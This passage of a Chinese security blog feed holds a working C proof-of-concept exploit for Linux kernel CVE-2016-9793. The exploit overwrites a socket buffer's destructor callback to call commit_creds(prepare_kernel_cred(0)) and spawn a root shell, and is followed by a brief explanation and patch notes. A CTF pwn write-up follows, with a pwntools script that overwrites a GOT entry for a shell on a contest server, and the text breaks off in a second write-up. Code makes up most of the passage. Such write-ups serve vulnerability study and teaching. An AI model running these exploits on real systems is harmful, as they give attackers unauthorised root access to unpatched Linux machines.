class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS 0xffffffff810a4b80</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810a4f30</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>))) (* _commit_creds)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __attribute__((regparm(<span class="number">3</span>))) (* _prepare_kernel_cred)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"></span><br><span class="line">_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;</span><br><span class="line">_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="comment">//puts("rooting....");</span></span><br><span class="line"> commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ubuf_info_t</span> &#123;</span></span><br><span class="line">  <span class="keyword">uint64_t</span> callback;        <span class="comment">// void (*callback)(struct ubuf_info *, bool)</span></span><br><span class="line">  <span class="keyword">uint64_t</span> ctx;             <span class="comment">// void *</span></span><br><span class="line">  <span class="keyword">uint64_t</span> desc;            <span class="comment">// unsigned long</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_info_t</span> &#123;</span></span><br><span class="line">  <span class="keyword">uint8_t</span>  nr_frags;        <span class="comment">// unsigned char</span></span><br><span class="line">  <span class="keyword">uint8_t</span>  tx_flags;        <span class="comment">// __u8</span></span><br><span class="line">  <span class="keyword">uint16_t</span> gso_size;        <span class="comment">// unsigned short</span></span><br><span class="line">  <span class="keyword">uint16_t</span> gso_segs;        <span class="comment">// unsigned short</span></span><br><span class="line">  <span class="keyword">uint16_t</span> gso_type;        <span class="comment">// unsigned short</span></span><br><span class="line">  <span class="keyword">uint64_t</span> frag_list;       <span class="comment">// struct sk_buff *</span></span><br><span class="line">  <span class="keyword">uint64_t</span> hwtstamps;       <span class="comment">// struct skb_shared_hwtstamps</span></span><br><span class="line">  <span class="keyword">uint32_t</span> tskey;           <span class="comment">// u32</span></span><br><span class="line">  <span class="keyword">uint32_t</span> ip6_frag_id;     <span class="comment">// __be32</span></span><br><span class="line">  <span class="keyword">uint32_t</span> dataref;         <span class="comment">// atomic_t</span></span><br><span class="line">  <span class="keyword">uint64_t</span> destructor_arg;  <span class="comment">// void *</span></span><br><span class="line">  <span class="keyword">uint8_t</span>  frags[<span class="number">16</span>][<span class="number">17</span>];   <span class="comment">// skb_frag_t frags[MAX_SKB_FRAGS];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sk_sndbuf = 0xffffff00 =&gt; skb_shinfo(skb) = 0x00000000fffffed0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SNDBUF 0xffffff00</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHINFO 0x00000000fffffed0</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ubuf_info_t</span> <span class="title">ubuf_info</span> = &#123;</span>(<span class="keyword">uint64_t</span>)&amp;get_root, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//struct ubuf_info_t ubuf_info = &#123;0xffffdeaddeadbeeful, 0, 0&#125;;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_info_t</span> *<span class="title">skb_shared_info</span> = (<span class="title">struct</span> <span class="title">skb_shared_info_t</span> *)<span class="title">SHINFO</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SKBTX_DEV_ZEROCOPY (1 &lt;&lt; 3)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">skb_thr</span><span class="params">(<span class="keyword">void</span>* arg)</span> </span>&#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">skb_shared_info-&gt;destructor_arg = (<span class="keyword">uint64_t</span>)&amp;ubuf_info;</span><br><span class="line">skb_shared_info-&gt;tx_flags |= SKBTX_DEV_ZEROCOPY;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> sockets[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">write_thr</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line"><span class="comment">// Write blocks until setsockopt(SO_SNDBUF).</span></span><br><span class="line"><span class="built_in">write</span>(sockets[<span class="number">1</span>], <span class="string">"\x5c"</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] got r00t\n"</span>);</span><br><span class="line">execl(<span class="string">"/bin/sh"</span>, <span class="string">"sh"</span>, <span class="literal">NULL</span>);</span><br><span class="line">perror(<span class="string">"execl()"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[-] something went wrong\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">void</span> *addr;</span><br><span class="line"><span class="keyword">int</span> rv;</span><br><span class="line"><span class="keyword">uint32_t</span> sndbuf;</span><br><span class="line"></span><br><span class="line">addr = mmap((<span class="keyword">void</span> *)(SHINFO &amp; <span class="number">0xfffffffffffff000</span>ul), <span class="number">0x1000</span>,</span><br><span class="line">PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE,</span><br><span class="line"><span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (addr != (<span class="keyword">void</span> *)(SHINFO &amp; <span class="number">0xfffffffffffff000</span>ul)) &#123;</span><br><span class="line">perror(<span class="string">"mmap()"</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[.] userspace payload mmapped at %p\n"</span>, addr);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">pthread_t</span> skb_th;</span><br><span class="line">    rv = pthread_create(&amp;skb_th, <span class="number">0</span>, skb_thr, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (rv != <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">"pthread_create()"</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line">    usleep(<span class="number">10000</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[.] overwriting thread started\n"</span>);</span><br><span class="line"></span><br><span class="line">rv = socketpair(AF_LOCAL, SOCK_STREAM, <span class="number">0</span>, &amp;sockets[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">if</span> (rv != <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">"socketpair()"</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[.] sockets opened\n"</span>);</span><br><span class="line"></span><br><span class="line">sndbuf = SNDBUF;</span><br><span class="line">rv = setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_SNDBUFFORCE,</span><br><span class="line">&amp;sndbuf, <span class="keyword">sizeof</span>(sndbuf));</span><br><span class="line"><span class="keyword">if</span> (rv != <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">"setsockopt()"</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[.] sock-&gt;sk_sndbuf set to 0x%x\n"</span>, SNDBUF * <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">pthread_t</span> write_th;</span><br><span class="line">rv = pthread_create(&amp;write_th, <span class="number">0</span>, write_thr, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (rv != <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">"pthread_create()"</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line">usleep(<span class="number">10000</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[.] writing to socket\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Wake up blocked write.</span></span><br><span class="line">rv = setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_SNDBUF,</span><br><span class="line">&amp;sndbuf, <span class="keyword">sizeof</span>(sndbuf));</span><br><span class="line"><span class="keyword">if</span> (rv != <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">"setsockopt()"</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line">usleep(<span class="number">10000</span>);</span><br><span class="line"><span class="built_in">close</span>(sockets[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">close</span>(sockets[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">void</span> *status;</span><br><span class="line">pthread_join(write_th, &amp;status);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="https://cdn.jsdelivr.net/gh/nuoye-blog/pic/img/20200813152634.png" alt="image-20200813152616561"></p><h3 id="提权分析"><a href="#提权分析" class="headerlink" title="提权分析"></a>提权分析</h3><p><code>close(sockets[0]);</code>时会调用<code>skb_release_data()</code>。其代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">skb_release_data</span><span class="params">(struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_info</span> *<span class="title">shinfo</span> = <span class="title">skb_shinfo</span>(<span class="title">skb</span>);</span></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (skb-&gt;cloned &amp;&amp;</span><br><span class="line">    atomic_sub_return(skb-&gt;nohdr ? (<span class="number">1</span> &lt;&lt; SKB_DATAREF_SHIFT) + <span class="number">1</span> : <span class="number">1</span>,</span><br><span class="line">      &amp;shinfo-&gt;dataref))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; shinfo-&gt;nr_frags; i++)</span><br><span class="line">__skb_frag_unref(&amp;shinfo-&gt;frags[i]);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If skb buf is from userspace, we need to notify the caller</span></span><br><span class="line"><span class="comment"> * the lower device DMA has done;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (shinfo-&gt;tx_flags &amp; SKBTX_DEV_ZEROCOPY) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ubuf_info</span> *<span class="title">uarg</span>;</span></span><br><span class="line"></span><br><span class="line">uarg = shinfo-&gt;destructor_arg;</span><br><span class="line"><span class="keyword">if</span> (uarg-&gt;callback)</span><br><span class="line">uarg-&gt;callback(uarg, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (shinfo-&gt;frag_list)</span><br><span class="line">kfree_skb_list(shinfo-&gt;frag_list);</span><br><span class="line"></span><br><span class="line">skb_free_head(skb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>skb_shinfo(skb)</code>返回值为<code>skb-&gt;end</code>+<code>skb-&gt;head</code>。接着通过获取到的shinfo读取destructor_arg结构，从而调用callback指针函数。</p><p>在POC中：</p><ol><li>通过<code>setsockopt(sockets[1], SOL_SOCKET, SO_SNDBUFFORCE,&amp;sndbuf, sizeof(sndbuf));</code>将设置<code>skb-&gt;end</code>为0xfffffec0，再加上<code>skb-&gt;head</code>（0x10），即<code>shinfo</code>=0xfffffed0。</li><li>接着通过skb_thr()函数不断将destructor_arg的callback指向提权函数get_root()，从而完成提权。</li></ol><h3 id="环境与复现"><a href="#环境与复现" class="headerlink" title="环境与复现"></a>环境与复现</h3><p><a href="https://github.com/nuoye-blog/cve/tree/master/cve-2016-9793" target="_blank" rel="noopener">https://github.com/nuoye-blog/cve/tree/master/cve-2016-9793</a></p><h3 id="漏洞修补"><a href="#漏洞修补" class="headerlink" title="漏洞修补"></a>漏洞修补</h3><p>可以在Linux kernel 4.8.14版本中看到<code>max_t(u32, val * 2, SOCK_MIN_SNDBUF);</code>和<code>max_t(u32, val * 2, SOCK_MIN_RCVBUF);</code>被修改为了<code>max_t(int, val * 2, SOCK_MIN_SNDBUF);</code>以及<code>max_t(int, val * 2, SOCK_MIN_RCVBUF);</code>。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>CVE-2016-9793 Linux kernel 安全漏洞-漏洞情报、漏洞详情、安全漏洞、CVE - 安全客，安全资讯平台  <a href="https://www.anquanke.com/vul/id/1123808" target="_blank" rel="noopener">https://www.anquanke.com/vul/id/1123808</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;CVE-2016-9793漏洞分析与利用&quot;&gt;&lt;a href=&quot;#CVE-2016-9793漏洞分析与利用&quot; class=&quot;headerlink&quot; title=&quot;CVE-2016-9793漏洞分析与利用&quot;&gt;&lt;/a&gt;CVE-2016-9793漏洞分析与利用&lt;/h2&gt;&lt;
      
    
    </summary>
    
    
      <category term="CVE" scheme="https://nuoye-blog.github.io/categories/CVE/"/>
    
    
      <category term="CVE" scheme="https://nuoye-blog.github.io/tags/CVE/"/>
    
      <category term="linux" scheme="https://nuoye-blog.github.io/tags/linux/"/>
    
      <category term="kernel" scheme="https://nuoye-blog.github.io/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>2020上海大学生网络安全赛pwn-WP</title>
    <link href="https://nuoye-blog.github.io/2020/11/15/18c2b223/"/>
    <id>https://nuoye-blog.github.io/2020/11/15/18c2b223/</id>
    <published>2020-11-15T07:00:00.000Z</published>
    <updated>2020-11-15T07:10:10.779Z</updated>
    
    <content type="html"><![CDATA[<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>linux中运行下命令就出来flag了。</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="cpu-emulator"><a href="#cpu-emulator" class="headerlink" title="cpu_emulator"></a>cpu_emulator</h3><p>简单的vm题，stack可以越界写</p><p>首先free掉一个0x20大小的chunk，然后利用stack的越界写修改其fd到bss段上，并且将它的size改掉，避免重复进入该chunk。</p><p>接着申请到bss段上把buf置0，并将stack指针修改为got表中atoi的地址。</p><p>最后按位加减got表中atoi函数地址，改成system，再输入/bin/sh即可getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">p = process(<span class="string">"emulator"</span>)</span><br><span class="line">p = remote(<span class="string">"123.56.52.128"</span>,<span class="string">"18236"</span>)</span><br><span class="line">libc = ELF(<span class="string">"emulator"</span>).libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">input_code</span><span class="params">(size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"instruction size:"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"instruction:"</span>)</span><br><span class="line">p.sendline(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(x)</span>:</span></span><br><span class="line"><span class="keyword">return</span> x &lt;&lt; <span class="number">0x1a</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count1</span><span class="params">(x)</span>:</span></span><br><span class="line">a2 = <span class="number">5</span></span><br><span class="line">a3 = <span class="number">21</span></span><br><span class="line"><span class="keyword">return</span> ((x&lt;&lt;a3) &amp; (((<span class="number">1</span> &lt;&lt; a2) - <span class="number">1</span>) &lt;&lt; a3))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count2</span><span class="params">(x)</span>:</span></span><br><span class="line">a2 = <span class="number">5</span></span><br><span class="line">a3 = <span class="number">16</span></span><br><span class="line"><span class="keyword">return</span> ((x&lt;&lt;a3) &amp; (((<span class="number">1</span> &lt;&lt; a2) - <span class="number">1</span>) &lt;&lt; a3))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count3</span><span class="params">(x)</span>:</span></span><br><span class="line">a2 = <span class="number">16</span></span><br><span class="line">a3 = <span class="number">0</span></span><br><span class="line"><span class="keyword">return</span> ((x&lt;&lt;a3) &amp; (((<span class="number">1</span> &lt;&lt; a2) - <span class="number">1</span>) &lt;&lt; a3))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(a,b,c,d)</span>:</span></span><br><span class="line"><span class="keyword">return</span> p64(command(a)+count1(b)+count2(c)+count3(d))</span><br><span class="line">libc.address = <span class="number">0x7ffff79e2000</span></span><br><span class="line">one = [<span class="number">0x4f3d5</span>,<span class="number">0x4f432</span>,<span class="number">0x10a41c</span>]</span><br><span class="line">code = <span class="string">''</span></span><br><span class="line">input_code(<span class="number">0xc8</span>,code)</span><br><span class="line">code = <span class="string">''</span></span><br><span class="line">input_code(<span class="number">0x38</span>,code)</span><br><span class="line">code = <span class="string">''</span></span><br><span class="line">code += cmd(<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x8000</span>)*<span class="number">2</span></span><br><span class="line">code += cmd(<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line">code += cmd(<span class="number">8</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">0xb0</span>)</span><br><span class="line">code += cmd(<span class="number">8</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">code += cmd(<span class="number">8</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">0x60</span>)</span><br><span class="line">code += cmd(<span class="number">8</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">0x21</span>)</span><br><span class="line">code += cmd(<span class="number">8</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">0x1</span>)</span><br><span class="line"></span><br><span class="line">code += cmd(<span class="number">0x2b</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">code += cmd(<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x1</span>)</span><br><span class="line">code += cmd(<span class="number">0x2b</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">code += cmd(<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x1</span>)</span><br><span class="line">code += cmd(<span class="number">0x2b</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">code += cmd(<span class="number">9</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x2</span>)</span><br><span class="line">code += cmd(<span class="number">9</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x8</span>)</span><br><span class="line">code += cmd(<span class="number">0x2b</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">0</span>)</span><br><span class="line">code += cmd(<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x1</span>)</span><br><span class="line">code += cmd(<span class="number">0x2b</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">0</span>)</span><br><span class="line">input_code(<span class="number">0xf00</span>,code)</span><br><span class="line">run()</span><br><span class="line">code = <span class="string">''</span></span><br><span class="line">input_code(<span class="number">0xc8</span>,code)</span><br><span class="line"></span><br><span class="line">code = <span class="string">''</span></span><br><span class="line">input_code(<span class="number">0xc8</span>,p64(<span class="number">0</span>)*<span class="number">23</span>+p64(<span class="number">0x602058</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code = <span class="string">''</span></span><br><span class="line">input_code(<span class="number">0x300</span>,code)</span><br><span class="line">code = <span class="string">''</span></span><br><span class="line">code += cmd(<span class="number">0x23</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line">code += cmd(<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">code += cmd(<span class="number">0x2b</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">code += cmd(<span class="number">0x23</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">code += cmd(<span class="number">9</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x12</span>)</span><br><span class="line">code += cmd(<span class="number">0x2b</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">code += cmd(<span class="number">0x23</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">code += cmd(<span class="number">9</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x50</span>)</span><br><span class="line">code += cmd(<span class="number">0x2b</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">input_code(<span class="number">0x400</span>,code)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x400911')</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.sym[<span class="string">'system'</span>])</span><br><span class="line">run()</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="lgtwo"><a href="#lgtwo" class="headerlink" title="lgtwo"></a>lgtwo</h3><p>存在off by one漏洞，利用该漏洞进行unlink操作将堆块操作地址指向bss段上，即可任意地址读写。</p><p>同时再向bss段上存放堆块的地址存写入main_arean地址，利用上面的地址修改其低位，爆破到stdout进行ioleak。</p><p>接着向<code>__free_hook</code>中写入system函数地址即可getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 